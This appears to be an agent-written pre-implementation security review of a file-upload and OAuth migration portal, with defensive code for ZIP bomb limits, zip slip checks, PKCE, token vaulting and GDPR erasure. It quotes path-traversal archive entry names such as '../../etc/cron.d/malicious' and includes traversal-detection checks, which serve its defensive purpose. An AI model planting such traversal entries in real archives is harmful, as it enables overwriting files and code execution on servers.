# security-engineer-tech: AI Migration Portal Security Review

**Agent**: security-engineer-tech
**Domain**: Security Engineering
**Date**: 2026-02-23
**Target**: AI Migration Portal (Feature Spec v1.0 — 2026-02-23)
**Spec Source**: `/home/jared/projects/AI-CIV/aether/docs/from-telegram/ai-migration-portal-spec.md`
**Classification**: PRE-IMPLEMENTATION REVIEW

---

## Executive Summary

The AI Migration Portal processes some of the most sensitive data in a user's digital life: years of private conversations, OAuth tokens with broad third-party access, and CRM data containing third-party PII. This is not a standard web feature — it is a data ingestion pipeline with a large attack surface.

**Overall Risk Rating: HIGH** (pre-mitigation)

This review identifies **4 CRITICAL**, **8 HIGH**, **9 MEDIUM**, and **5 LOW** issues that must be addressed before implementation begins. Several require architectural decisions (not just code fixes) and must be resolved at design time.

**Blocking issues for any production deployment:**
- ZIP bomb / decompression bomb prevention (CRIT-001)
- Zip slip path traversal (CRIT-002)
- OAuth PKCE enforcement for Canva (CRIT-003)
- HubSpot PII — no-store enforcement at the pipeline level (CRIT-004)

---

## Table of Contents

1. File Upload Security
2. OAuth Security
3. Data Privacy / GDPR
4. API Security
5. Processing Pipeline Security
6. Risk Matrix

---

## 1. File Upload Security

### CRIT-001: ZIP Bomb / Decompression Bomb

**Severity**: CRITICAL
**Category**: Denial of Service / Resource Exhaustion

**Threat**: The spec states users upload `conversations.zip` from OpenAI/Claude exports. A malicious or malformed ZIP archive can contain files that expand to gigabytes when decompressed (classic 42.zip or nested archives). If the server decompresses without limits, this results in:
- Disk exhaustion
- Memory exhaustion
- Server crash / complete service outage

**Current spec guidance**: None. Spec says "encrypted temp storage" but no decompression limits defined.

**Required mitigations (all must be implemented):**

1. **Max compressed size**: Reject uploads larger than 50MB before any processing.

2. **Max decompressed size**: Stream decompression and abort if total decompressed bytes exceed 500MB. Never fully decompress first, then check.

3. **Max file count inside ZIP**: Reject archives with more than 500 files.

4. **Max individual file size**: Reject any single file inside the ZIP that exceeds 200MB.

5. **Max nesting depth**: Reject ZIPs that contain ZIPs (depth > 1). ChatGPT exports are flat archives.

6. **Implementation pattern (Python example)**:

```python
import zipfile
import os

MAX_COMPRESSED_SIZE = 50 * 1024 * 1024      # 50 MB
MAX_DECOMPRESSED_SIZE = 500 * 1024 * 1024   # 500 MB
MAX_FILE_COUNT = 500
MAX_SINGLE_FILE = 200 * 1024 * 1024         # 200 MB

def safe_unzip(zip_path: str, extract_to: str):
    if os.path.getsize(zip_path) > MAX_COMPRESSED_SIZE:
        raise ValueError("Archive exceeds maximum compressed size")

    total_extracted = 0
    file_count = 0

    with zipfile.ZipFile(zip_path, 'r') as zf:
        for info in zf.infolist():
            # Reject nested ZIPs
            if info.filename.endswith('.zip'):
                raise ValueError("Nested ZIP archives not permitted")

            file_count += 1
            if file_count > MAX_FILE_COUNT:
                raise ValueError("Archive contains too many files")

            if info.file_size > MAX_SINGLE_FILE:
                raise ValueError(f"File {info.filename} exceeds single-file size limit")

            total_extracted += info.file_size
            if total_extracted > MAX_DECOMPRESSED_SIZE:
                raise ValueError("Total decompressed size exceeds limit")

            # Only extract after all checks pass (see CRIT-002 for path check)
            _safe_extract_member(zf, info, extract_to)
```

---

### CRIT-002: Zip Slip Path Traversal

**Severity**: CRITICAL
**Category**: Arbitrary File Write / Remote Code Execution

**Threat**: ZIP archives can contain entries with filenames like `../../etc/cron.d/malicious` or `../../../app/config/settings.py`. Standard `zipfile.extractall()` in Python follows these paths and writes files outside the intended temp directory. This can overwrite application code, configuration files, or system files — leading to remote code execution.

**This is a well-known, commonly exploited vulnerability. It must be fixed before any ZIP processing code ships.**

**Required mitigation**:

Every file extracted from a ZIP must have its final path validated to confirm it remains inside the intended extraction directory.

```python
import os
import zipfile

def _safe_extract_member(zf: zipfile.ZipFile, info: zipfile.ZipInfo, extract_to: str):
    # Resolve the extraction root to an absolute, canonical path
    extract_root = os.path.realpath(extract_to)

    # Compute the target path
    target_path = os.path.realpath(os.path.join(extract_root, info.filename))

    # Verify target is inside the extraction root
    if not target_path.startswith(extract_root + os.sep):
        raise ValueError(
            f"Zip slip detected: {info.filename} would extract outside target directory"
        )

    # Safe to extract
    zf.extract(info, extract_to)
```

**Note for Node.js implementations**: The `unzipper` package is safer than `adm-zip` for this reason. Always validate `entry.path` against the target directory regardless of library used.

---

### HIGH-001: File Type Validation — Defense in Depth

**Severity**: HIGH
**Category**: Malicious File Upload

**Threat**: Accepting only `.zip`, `.json`, `.csv` by file extension alone is insufficient. An attacker can rename a malicious file (e.g., a PHP webshell) as `conversations.zip`. Extension checks are trivially bypassed.

**Required mitigations**:

1. **MIME type check** (server-side, not client-supplied `Content-Type`): Read the first 8 bytes of the file and validate the magic bytes.

```python
MAGIC_BYTES = {
    'zip':  b'PK\x03\x04',
    'json': None,  # No magic bytes for JSON — validate by parse attempt
    'csv':  None,  # No magic bytes for CSV — validate by parse attempt
}

def validate_file_magic(file_path: str, expected_type: str):
    with open(file_path, 'rb') as f:
        header = f.read(8)
    if expected_type == 'zip':
        if not header.startswith(b'PK\x03\x04'):
            raise ValueError("File is not a valid ZIP archive")
    elif expected_type == 'json':
        try:
            import json
            with open(file_path, 'r', encoding='utf-8') as f:
                json.load(f)
        except (json.JSONDecodeError, UnicodeDecodeError):
            raise ValueError("File is not valid JSON")
    elif expected_type == 'csv':
        import csv
        with open(file_path, 'r', encoding='utf-8') as f:
            reader = csv.reader(f)
            next(reader)  # Validate at least one row is parseable
```

2. **Content validation after extraction**: After unzipping, confirm the extracted files match expected schemas (e.g., `conversations.json` must have a `conversations` array key, not arbitrary structure).

3. **Allowlist extracted filenames**: Only process files with expected names (`conversations.json`, `user.json`, `message_feedback.json`). Silently discard any other extracted files.

---

### HIGH-002: File Size Limits on Upload Endpoint

**Severity**: HIGH
**Category**: Resource Exhaustion

**Threat**: Without enforced upload size limits at the HTTP layer, attackers can send multi-gigabyte POST requests that exhaust server memory or disk before any application-level check runs.

**Required mitigations**:

1. **Web server level**: Configure nginx/Cloudflare to reject uploads over 50MB before the request reaches the application.

```nginx
# nginx.conf
client_max_body_size 50m;
```

2. **Application level** (defense in depth): Enforce independently in application code.

```python
# FastAPI example
from fastapi import UploadFile, HTTPException

MAX_UPLOAD_BYTES = 50 * 1024 * 1024  # 50 MB

async def receive_upload(file: UploadFile):
    contents = await file.read(MAX_UPLOAD_BYTES + 1)
    if len(contents) > MAX_UPLOAD_BYTES:
        raise HTTPException(413, "File too large")
    return contents
```

3. **Timeout enforcement**: File uploads must have a hard timeout (e.g., 60 seconds) to prevent slow-upload Slowloris-style attacks.

---

### HIGH-003: Malware Scanning

**Severity**: HIGH
**Category**: Malicious Payload Distribution

**Threat**: Users upload files from their own machines. A user whose machine is infected could unknowingly upload a ZIP containing malware. While PureBrain processes these files server-side (not serving them back to users), there are residual risks: infected files in temp storage could be triggered by server-side processing tools, or if file serving is ever added to the migration summary feature.

**Recommended approach** (phased):

**Phase 1 (MVP)**: Scan uploaded files with ClamAV before processing.

```bash
# Install ClamAV
apt-get install clamav clamav-daemon
freshclam  # Update definitions

# Python integration
import subprocess

def scan_file(file_path: str) -> bool:
    result = subprocess.run(
        ['clamscan', '--no-summary', file_path],
        capture_output=True
    )
    # Return code 0 = clean, 1 = infected, 2 = error
    if result.returncode == 1:
        raise ValueError("Malware detected in uploaded file")
    return result.returncode == 0
```

**Phase 2**: Consider a cloud-based scanning service (VirusTotal Enterprise API or similar) for broader signature coverage.

**Note**: This adds 1-3 seconds of processing time per upload. Acceptable for this use case. Run scan before any decompression or parsing.

---

### MEDIUM-001: Temp File Encryption at Rest

**Severity**: MEDIUM
**Category**: Data at Rest Exposure

**Threat**: Uploaded conversation archives contain years of private conversations. If temp storage is compromised (server breach, misconfigured permissions, shared storage), unencrypted files expose all user data.

**Spec mentions**: "encrypted temp storage" — this is the right intention but needs concrete implementation.

**Required implementation**:

1. Use a dedicated encrypted temp directory (separate filesystem with encryption-at-rest, or application-level encryption).

2. Application-level encryption for files on standard filesystems:

```python
from cryptography.fernet import Fernet
import os

def write_encrypted_temp(data: bytes, temp_dir: str) -> tuple[str, bytes]:
    """Write data encrypted. Returns (file_path, encryption_key)."""
    key = Fernet.generate_key()
    f = Fernet(key)
    encrypted = f.encrypt(data)

    temp_path = os.path.join(temp_dir, os.urandom(16).hex() + '.enc')
    with open(temp_path, 'wb') as fp:
        fp.write(encrypted)

    return temp_path, key  # Store key separately from file

def read_encrypted_temp(file_path: str, key: bytes) -> bytes:
    f = Fernet(key)
    with open(file_path, 'rb') as fp:
        encrypted = fp.read()
    return f.decrypt(encrypted)
```

3. Store the per-file encryption key in the user's session (not alongside the file).

4. Auto-deletion: Register a cleanup job at upload time. Do not rely on periodic batch cleanup alone.

```python
import threading

def schedule_file_deletion(file_path: str, delay_seconds: int = 3600):
    """Delete temp file after processing completes, max 1 hour."""
    def delete():
        try:
            os.unlink(file_path)
        except FileNotFoundError:
            pass  # Already deleted
    timer = threading.Timer(delay_seconds, delete)
    timer.daemon = True
    timer.start()
```

5. **Delete immediately after processing** — do not wait for the scheduled deletion. The scheduled deletion is a safety net for processing failures.

---

### MEDIUM-002: File Processing Isolation (Sandboxing)

**Severity**: MEDIUM
**Category**: Privilege Escalation / Container Escape

**Threat**: The processing pipeline parses untrusted user-supplied JSON. If a JSON parser has a vulnerability (prototype pollution, memory corruption), processing runs with the application's full privileges.

**Required approach**:

1. **Dedicated processing worker**: Run file parsing in a separate process (not a thread) with reduced privileges.

```python
import multiprocessing
import resource

def _parser_worker(file_path: str, result_queue: multiprocessing.Queue):
    """Runs in isolated process with resource limits."""
    # Set memory limit: 512MB
    resource.setrlimit(resource.RLIMIT_AS, (512 * 1024 * 1024, 512 * 1024 * 1024))
    # Set CPU time limit: 30 seconds
    resource.setrlimit(resource.RLIMIT_CPU, (30, 30))

    try:
        result = parse_conversations(file_path)
        result_queue.put({'status': 'ok', 'data': result})
    except Exception as e:
        result_queue.put({'status': 'error', 'message': str(e)})

def process_file_isolated(file_path: str):
    queue = multiprocessing.Queue()
    p = multiprocessing.Process(target=_parser_worker, args=(file_path, queue))
    p.start()
    p.join(timeout=60)

    if p.is_alive():
        p.terminate()
        raise TimeoutError("File processing exceeded time limit")

    result = queue.get_nowait()
    if result['status'] == 'error':
        raise ValueError(result['message'])
    return result['data']
```

2. **Docker / container isolation** (preferred for production): Run the parsing service as a separate container with `--read-only` filesystem, `--no-new-privileges`, and minimal network access.

---

## 2. OAuth Security

### CRIT-003: PKCE Enforcement for Canva OAuth

**Severity**: CRITICAL
**Category**: Authorization Code Interception / OAuth CSRF

**Threat**: The Canva API documentation explicitly requires PKCE (Proof Key for Code Exchange) for its OAuth flow. PKCE prevents authorization code interception attacks where a malicious application on the same device intercepts the OAuth callback. Without PKCE, an attacker who intercepts the authorization code can exchange it for access tokens.

**The spec correctly notes**: "PKCE required per their API" — this must be enforced in implementation.

**Required implementation**:

```python
import secrets
import hashlib
import base64

def generate_pkce_pair() -> tuple[str, str]:
    """Generate PKCE code_verifier and code_challenge."""
    # code_verifier: 43-128 character URL-safe random string
    code_verifier = secrets.token_urlsafe(64)

    # code_challenge: S256 hash of verifier
    digest = hashlib.sha256(code_verifier.encode()).digest()
    code_challenge = base64.urlsafe_b64encode(digest).rstrip(b'=').decode()

    return code_verifier, code_challenge

def build_canva_auth_url(state: str, code_verifier: str) -> str:
    _, code_challenge = generate_pkce_pair()  # Note: pass verifier in, not regenerate
    # Store code_verifier in server-side session (NOT in client)
    params = {
        'response_type': 'code',
        'client_id': CANVA_CLIENT_ID,
        'redirect_uri': REDIRECT_URI,
        'scope': 'design:meta:read asset:read brandtemplate:meta:read',
        'state': state,
        'code_challenge': code_challenge,
        'code_challenge_method': 'S256',
    }
    return 'https://www.canva.com/api/oauth/authorize?' + urlencode(params)

def exchange_canva_code(code: str, code_verifier: str) -> dict:
    """Exchange authorization code using the stored code_verifier."""
    response = requests.post('https://api.canva.com/rest/v1/oauth/token', data={
        'grant_type': 'authorization_code',
        'code': code,
        'code_verifier': code_verifier,  # REQUIRED — proves we initiated the flow
        'redirect_uri': REDIRECT_URI,
        'client_id': CANVA_CLIENT_ID,
        'client_secret': CANVA_CLIENT_SECRET,
    })
    response.raise_for_status()
    return response.json()
```

**Apply PKCE to all OAuth flows** where the provider supports it (Notion, HubSpot, Google also support PKCE — use it for all of them even when not strictly required, as defense in depth).

---

### HIGH-004: State Parameter for CSRF Prevention

**Severity**: HIGH
**Category**: Cross-Site Request Forgery on OAuth Callback

**Threat**: Without a `state` parameter in OAuth flows, an attacker can craft a malicious URL that causes a victim's browser to complete an OAuth authorization for an attacker-controlled account. The victim's application then stores the attacker's tokens as if they were the victim's own — giving the attacker access to whatever the victim's application imports.

**Required implementation**:

```python
import secrets

def initiate_oauth(provider: str, user_session: dict) -> str:
    """Generate and store a CSRF state token before redirecting to OAuth."""
    state = secrets.token_urlsafe(32)

    # Store state in server-side session (not cookie-only)
    user_session[f'oauth_state_{provider}'] = state

    return state

def validate_oauth_callback(provider: str, received_state: str, user_session: dict):
    """Validate state on callback. Reject if missing or mismatched."""
    expected_state = user_session.pop(f'oauth_state_{provider}', None)

    if not expected_state:
        raise SecurityError("No OAuth state found in session — possible CSRF")

    if not secrets.compare_digest(received_state, expected_state):
        raise SecurityError("OAuth state mismatch — CSRF attack blocked")
```

**State must be**:
- Cryptographically random (minimum 128 bits / 16 bytes)
- Single-use (consumed on first use, not reusable)
- Bound to the user's session server-side
- Validated before exchanging the authorization code for tokens

---

### HIGH-005: Token Storage — Vault Architecture

**Severity**: HIGH
**Category**: Credential Theft / Account Takeover

**Threat**: Storing OAuth access tokens or refresh tokens in a database column (even if the database is encrypted at rest) creates a high-value target. A SQL injection or database backup leak exposes all user OAuth tokens, giving attackers access to users' Notion, HubSpot, and Canva accounts.

**The spec correctly states**: "stored in a secrets vault (not in the database directly)" — this must be enforced at the architecture level.

**Required implementation**:

**Option A (Recommended for MVP)**: HashiCorp Vault

```python
import hvac

vault_client = hvac.Client(url='http://vault:8200', token=VAULT_TOKEN)

def store_oauth_token(user_id: str, provider: str, token_data: dict):
    """Store token in Vault, return reference path (safe to store in DB)."""
    path = f'secret/users/{user_id}/oauth/{provider}'
    vault_client.secrets.kv.v2.create_or_update_secret(
        path=path,
        secret=token_data,
    )
    return path  # This path reference is stored in the DB, not the token

def retrieve_oauth_token(vault_path: str) -> dict:
    """Retrieve token from Vault using stored path."""
    response = vault_client.secrets.kv.v2.read_secret_version(path=vault_path)
    return response['data']['data']
```

**Option B (Simpler, acceptable for MVP)**: Envelope encryption using a KMS-managed key

```python
# Store in DB: encrypted_token_blob (encrypted with KMS key)
# KMS key is managed externally (AWS KMS, Google Cloud KMS)
# Even if DB is leaked, tokens cannot be decrypted without KMS access

import boto3
from base64 import b64encode, b64decode
import json

kms = boto3.client('kms', region_name='us-east-1')

def encrypt_token(token_data: dict) -> str:
    plaintext = json.dumps(token_data).encode()
    response = kms.encrypt(KeyId=KMS_KEY_ID, Plaintext=plaintext)
    return b64encode(response['CiphertextBlob']).decode()

def decrypt_token(encrypted_token: str) -> dict:
    ciphertext = b64decode(encrypted_token)
    response = kms.decrypt(CiphertextBlob=ciphertext)
    return json.loads(response['Plaintext'])
```

**Never acceptable**:
- Storing raw access tokens in a database column
- Storing tokens in Redis without encryption
- Logging token values anywhere (even in debug logs)

---

### HIGH-006: Token Scope Minimization

**Severity**: HIGH
**Category**: Over-privileged Access / Credential Misuse

**Threat**: Requesting broader OAuth scopes than necessary increases the blast radius if tokens are stolen. A token that can read all of Notion becomes a full workspace exfiltration risk. A token that can read only selected databases is a much smaller risk.

**Required scope definitions per provider**:

| Provider | Required Scope | Explicitly Excluded Scope |
|----------|----------------|---------------------------|
| **Notion** | `read_content` (pages/databases user selects) | `update_content`, `insert_content`, `read_user_without_email` (exclude unless needed) |
| **HubSpot** | `crm.objects.contacts.read`, `crm.objects.deals.read`, `crm.pipelines.orders.read` | `crm.objects.contacts.write`, `conversations.read` (unless specifically needed), all write scopes |
| **Canva** | `design:meta:read`, `asset:read`, `brandtemplate:meta:read` | `design:content:read` (full design files not needed), all write scopes |
| **Google (Gemini)** | `https://www.googleapis.com/auth/drive.readonly` (with specific folder selection) | `https://mail.google.com/` (no email access), `https://www.googleapis.com/auth/calendar` |

**Implementation requirement**: Request only scopes listed above. If a future feature needs more scope, prompt the user for a new authorization — do not request future scopes speculatively.

---

### MEDIUM-003: Token Refresh and Rotation

**Severity**: MEDIUM
**Category**: Token Persistence / Long-lived Credential Risk

**Required behavior**:

1. **Short-lived access tokens**: Use access tokens with their provider-specified expiry. Do not extend beyond what the provider issues.

2. **Refresh token storage**: Refresh tokens must be stored with the same vault security as access tokens. They are more sensitive (longer-lived).

3. **Automatic rotation**: When a refresh produces a new refresh token, immediately replace the old one in the vault and invalidate the old token if the API supports it.

4. **Revocation flow**: Provide a "Disconnect [Provider]" button in portal settings that:
   - Calls the provider's token revocation endpoint
   - Deletes the token from the vault
   - Removes the vault path reference from the database

```python
REVOCATION_ENDPOINTS = {
    'notion':  None,  # Notion does not expose a revocation endpoint; delete from vault only
    'hubspot': 'https://api.hubapi.com/oauth/v1/refresh-tokens/{token}',
    'canva':   'https://api.canva.com/rest/v1/oauth/token',  # DELETE method
    'google':  'https://oauth2.googleapis.com/revoke?token={token}',
}

def revoke_token(provider: str, user_id: str):
    token_data = retrieve_oauth_token(get_vault_path(user_id, provider))
    endpoint_template = REVOCATION_ENDPOINTS.get(provider)

    if endpoint_template:
        token = token_data.get('refresh_token') or token_data.get('access_token')
        endpoint = endpoint_template.format(token=token)
        requests.post(endpoint)  # Ignore errors — vault deletion still proceeds

    delete_from_vault(user_id, provider)
    clear_vault_path_from_db(user_id, provider)
```

---

## 3. Data Privacy / GDPR

### CRIT-004: HubSpot Third-Party PII — Architectural Enforcement

**Severity**: CRITICAL
**Category**: GDPR Violation / Third-Party Data Misuse

**Threat**: HubSpot CRM data includes PII belonging to the user's contacts (customers, prospects). These are third parties who have no relationship with PureBrain and have not consented to their data being processed by PureBrain. Storing this data violates:
- GDPR Article 6 (no lawful basis for processing third-party contact PII)
- GDPR Article 14 (third parties would have no way to exercise their rights)

**The spec correctly states**: "Individual contact records should NOT be stored — only structural data." This must be enforced at the pipeline architecture level, not just at the code level.

**Required architectural enforcement**:

```python
# The HubSpot parser MUST strip all personal identifiers before the result
# reaches any storage layer

def parse_hubspot_for_context(oauth_token: str) -> dict:
    """
    Parse HubSpot data for context extraction.
    Returns ONLY structural data — no PII stored.
    """
    raw_contacts = fetch_hubspot_contacts(oauth_token)
    raw_deals = fetch_hubspot_deals(oauth_token)
    raw_pipelines = fetch_hubspot_pipelines(oauth_token)

    # ALLOWED: structural/aggregate data
    context = {
        'contact_count': len(raw_contacts),  # aggregate count only
        'deal_count': len(raw_deals),
        'pipeline_names': [p['label'] for p in raw_pipelines],  # stage names only
        'deal_stage_names': extract_stage_names(raw_deals),  # stage names only
        'industries': extract_industry_names(raw_contacts),  # aggregate non-PII fields
    }

    # PROHIBITED: the following must NEVER reach the return value or any storage
    # - contact['email']
    # - contact['firstname'] + contact['lastname']
    # - contact['phone']
    # - deal['hs_deal_stage'] if it contains client names
    # - any company name that identifies a specific contact

    # raw_contacts and raw_deals are discarded here, in-memory only
    del raw_contacts
    del raw_deals

    return context  # Only structural data

# Verification: assert no PII keys in output
def assert_no_pii(context: dict):
    PII_KEYS = {'email', 'phone', 'firstname', 'lastname', 'name', 'address'}
    for key in PII_KEYS:
        assert key not in context, f"PII key '{key}' found in HubSpot context output"
```

**Audit requirement**: Add a test that calls `assert_no_pii` on every HubSpot parser output in the test suite. This test must never be removed.

---

### HIGH-007: Data Processing Consent Flow

**Severity**: HIGH
**Category**: GDPR Article 6 / Article 7 Compliance

**Threat**: Processing user conversation history requires explicit consent under GDPR for EU users. The current spec mentions a privacy note on Step 2 but does not define a consent capture mechanism.

**Required implementation**:

1. **Explicit consent checkbox** before file upload begins (not just a privacy note):

```html
<!-- Step 1, before upload is enabled -->
<label class="consent-checkbox">
  <input type="checkbox" id="migration-consent" required />
  I consent to PureBrain processing my imported conversation data to create
  my personal context profile. I understand this data will not be used to
  train any AI model and will be processed only for my personal use.
  <a href="/privacy-policy#migration" target="_blank">See full details</a>
</label>

<button id="upload-btn" disabled>Upload File</button>

<script>
document.getElementById('migration-consent').addEventListener('change', (e) => {
  document.getElementById('upload-btn').disabled = !e.target.checked;
});
</script>
```

2. **Log consent with timestamp** (server-side):

```python
def record_migration_consent(user_id: str, ip_address: str, user_agent: str):
    db.execute("""
        INSERT INTO migration_consent_log
        (user_id, consented_at, ip_address, user_agent, consent_version)
        VALUES (?, NOW(), ?, ?, ?)
    """, (user_id, ip_address, user_agent, CONSENT_VERSION))
```

3. **Consent version**: Store a consent version string. If the privacy policy changes, require re-consent before allowing new migrations.

---

### HIGH-008: Right to Erasure Implementation

**Severity**: HIGH
**Category**: GDPR Article 17 Compliance

**Threat**: GDPR gives EU users the right to have all their data deleted. "All migration data" must be fully deletable, and the deletion must cascade to all storage locations.

**Required deletion cascade**:

```python
def delete_all_migration_data(user_id: str):
    """
    Full Right to Erasure implementation for migration data.
    Must delete from ALL storage locations.
    """
    # 1. Delete context profile from database
    db.execute("DELETE FROM user_migration_profile WHERE user_id = ?", (user_id,))

    # 2. Delete migration status and config
    db.execute("DELETE FROM migration_status WHERE user_id = ?", (user_id,))

    # 3. Delete all OAuth tokens from Vault
    for provider in ['notion', 'hubspot', 'canva', 'google']:
        try:
            revoke_token(provider, user_id)
        except Exception:
            pass  # Provider revocation can fail; vault deletion must still proceed
        delete_from_vault(user_id, provider)

    # 4. Delete vault path references from database
    db.execute("DELETE FROM oauth_vault_paths WHERE user_id = ?", (user_id,))

    # 5. Delete any temp files still associated with this user
    delete_user_temp_files(user_id)

    # 6. Delete consent log? — NOTE: Retain consent log for legal compliance
    # (evidence of consent can be required by regulators even after erasure request)
    # Mark as 'erased' rather than deleting
    db.execute("""
        UPDATE migration_consent_log
        SET erased_at = NOW(), data_erased = TRUE
        WHERE user_id = ?
    """, (user_id,))

    # 7. Log the erasure for audit trail
    db.execute("""
        INSERT INTO erasure_audit_log (user_id, erased_at, erased_by)
        VALUES (?, NOW(), 'user_request')
    """, (user_id,))
```

**UI requirement**: "Delete all migration data" option must be accessible from portal settings without requiring user to contact support.

---

### MEDIUM-004: Data Retention Policy Enforcement

**Severity**: MEDIUM
**Category**: Data Minimization / GDPR Article 5(1)(e)

**Required retention rules**:

| Data Type | Retention Period | Deletion Method |
|-----------|-----------------|-----------------|
| Uploaded temp files | Immediately after processing (hard max: 1 hour) | `os.unlink()` + scheduled cleanup job |
| Extracted conversation content | Never stored — patterns extracted in-memory only | No storage = no retention needed |
| `user_context_profile` JSON | Until user deletes account or requests erasure | Cascade delete on account deletion |
| OAuth tokens | Until user disconnects integration or deletes account | Vault deletion + DB cleanup |
| `migration_consent_log` | 7 years (legal compliance) | Cannot be erased; mark as anonymized |
| HubSpot raw contact data | Zero retention — in-memory processing only | Never written to disk |

**Enforcement mechanism**: Add a cron job that runs hourly to verify no temp files older than 1 hour exist. Alert on any found.

```python
# cron: every hour
def audit_temp_files():
    import time
    MAX_AGE_SECONDS = 3600  # 1 hour

    for filename in os.listdir(TEMP_DIR):
        filepath = os.path.join(TEMP_DIR, filename)
        age = time.time() - os.path.getmtime(filepath)
        if age > MAX_AGE_SECONDS:
            os.unlink(filepath)
            alert_team(f"Stale temp file deleted: {filename} (age: {age:.0f}s)")
```

---

### MEDIUM-005: Cross-Border Data Transfer Considerations

**Severity**: MEDIUM
**Category**: GDPR Chapter V Compliance

**Issues**:

1. **Data residency**: The spec does not specify where migration processing occurs. EU user data must not be transferred to non-EU servers without adequate safeguards (Standard Contractual Clauses or adequacy decision).

2. **Third-party API calls**: When fetching Notion/HubSpot/Canva data via OAuth, EU user data transits through those providers' servers. Document this in the DPA and privacy policy.

**Required actions**:

1. Define the data residency region for migration processing in architecture documentation.
2. If using US-based cloud providers for EU users, implement Standard Contractual Clauses.
3. Update the Privacy Policy to list all data processors (Notion, HubSpot, Canva, the cloud provider) with their data residency regions.
4. Consider offering EU users an EU-region processing option at signup.

---

### LOW-001: PII Handling in Conversation Imports

**Severity**: LOW (mitigated by architecture if pipeline is in-memory)
**Category**: Data Minimization

**Guidance**: Conversation history from ChatGPT/Claude may contain significant PII: the user's own private conversations, names of people they discuss, emails, phone numbers, medical information, financial data. This is expected and legitimate — the user is uploading their own data for context extraction.

**Required mitigations**:
1. Extraction is pattern-based (topic frequency, style analysis) — do not store raw conversation content.
2. Log a summary of what was extracted (topic categories, count) but never log message content.
3. If any extracted vocabulary or entity list contains strings that look like emails or phone numbers, strip them before storing in the context profile.

```python
import re

PII_PATTERNS = [
    r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # email
    r'\b\d{3}[-.\s]?\d{3}[-.\s]?\d{4}\b',  # US phone
    r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b',  # credit card pattern
]

def strip_pii_from_vocabulary(terms: list[str]) -> list[str]:
    clean = []
    for term in terms:
        if not any(re.search(p, term) for p in PII_PATTERNS):
            clean.append(term)
    return clean
```

---

## 4. API Security

### HIGH-009: Authentication for Migration Endpoints

**Severity**: HIGH
**Category**: Unauthorized Access

**Threat**: Migration endpoints process sensitive data and trigger expensive operations (file parsing, OAuth token usage). They must be gated behind authentication. The spec does not address this explicitly.

**Required implementation**:

1. **All migration endpoints require valid session authentication**. Use the same auth middleware as the rest of the portal.

2. **User isolation**: Every migration endpoint must verify that the `user_id` in the request matches the authenticated session's `user_id`. Never use user-supplied `user_id` without verification.

```python
# FastAPI example
from fastapi import Depends, HTTPException
from auth import get_current_user

@router.post("/migration/upload")
async def upload_migration_file(
    file: UploadFile,
    current_user: User = Depends(get_current_user)  # Auth enforced
):
    # current_user.id is from the verified session token
    # NEVER: user_id = request.json['user_id']
    process_upload(user_id=current_user.id, file=file)
```

3. **Migration job status**: When polling job status, verify the job belongs to the authenticated user.

```python
@router.get("/migration/status/{job_id}")
async def get_migration_status(job_id: str, current_user: User = Depends(get_current_user)):
    job = db.get_job(job_id)
    if job.user_id != current_user.id:
        raise HTTPException(403, "Access denied")  # Do not leak job existence
    return job.status
```

---

### HIGH-010: Rate Limiting on Upload Endpoint

**Severity**: HIGH
**Category**: Denial of Service / Abuse

**Threat**: File upload endpoints without rate limiting allow:
- DoS via repeated large uploads exhausting storage or processing capacity
- Abuse of processing resources
- Enumeration attacks on job status endpoints

**Required rate limits**:

| Endpoint | Limit | Window |
|----------|-------|--------|
| `POST /migration/upload` | 3 uploads | Per user per hour |
| `GET /migration/status/{job_id}` | 60 requests | Per user per minute |
| `POST /migration/oauth/initiate` | 10 requests | Per user per hour |
| `POST /migration/delete` (erasure) | 5 requests | Per user per day |

**Implementation** (Redis-backed):

```python
import redis
from functools import wraps

redis_client = redis.Redis()

def rate_limit(key_prefix: str, max_calls: int, window_seconds: int):
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, current_user: User, **kwargs):
            key = f"ratelimit:{key_prefix}:{current_user.id}"
            current = redis_client.incr(key)
            if current == 1:
                redis_client.expire(key, window_seconds)
            if current > max_calls:
                raise HTTPException(429, "Rate limit exceeded")
            return await func(*args, current_user=current_user, **kwargs)
        return wrapper
    return decorator

@router.post("/migration/upload")
@rate_limit("upload", max_calls=3, window_seconds=3600)
async def upload_migration_file(file: UploadFile, current_user: User = Depends(get_current_user)):
    ...
```

---

### MEDIUM-006: Input Validation and Sanitization

**Severity**: MEDIUM
**Category**: Injection / Data Integrity

**Required validation rules**:

1. **File upload**: Validate filename. Reject filenames containing path separators, null bytes, or non-ASCII characters.

```python
import re

def validate_filename(filename: str):
    # Only allow alphanumeric, dash, underscore, dot
    if not re.match(r'^[\w\-\.]+$', filename):
        raise ValueError(f"Invalid filename: {filename}")
    if '..' in filename or '/' in filename or '\\' in filename:
        raise ValueError("Path traversal in filename")
    if '\x00' in filename:
        raise ValueError("Null byte in filename")
```

2. **OAuth state parameter**: Validate that received state is URL-safe alphanumeric only before database lookup.

3. **Manual text inputs** (Midjourney style description, Perplexity paste): Enforce max length (1000 characters), sanitize HTML entities before storage.

4. **CSV upload**: Validate column headers before processing. Reject CSVs with unexpected schemas rather than silently ignoring unknown columns.

---

### MEDIUM-007: CORS Configuration

**Severity**: MEDIUM
**Category**: Cross-Origin Request Forgery

**Required configuration**:

```python
# FastAPI CORS middleware
from fastapi.middleware.cors import CORSMiddleware

ALLOWED_ORIGINS = [
    "https://purebrain.ai",
    "https://app.purebrain.ai",
]

# Only add staging origin in non-production environments
if ENVIRONMENT == 'staging':
    ALLOWED_ORIGINS.append("https://staging.purebrain.ai")

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=True,       # Required for session cookies
    allow_methods=["GET", "POST", "DELETE"],
    allow_headers=["Content-Type", "Authorization"],
    # Do NOT use allow_origins=["*"] — this is wrong for credentialed requests
)
```

**Common mistake**: `allow_origins=["*"]` cannot be combined with `allow_credentials=True`. Browsers will reject this combination. The wildcard must be replaced with an explicit list.

---

### MEDIUM-008: Error Handling — No Data Leakage

**Severity**: MEDIUM
**Category**: Information Disclosure

**Threat**: Verbose error messages (stack traces, SQL errors, file paths) reveal internal architecture and help attackers find vulnerabilities.

**Lesson from prior chatbox review**: We blocked a HIGH issue where raw error messages were rendered in UI. Apply the same discipline here.

**Required implementation**:

```python
# Global exception handler — never expose internal details
@app.exception_handler(Exception)
async def global_exception_handler(request: Request, exc: Exception):
    # Log full error internally (with stack trace)
    logger.error("Unhandled exception", exc_info=exc, extra={
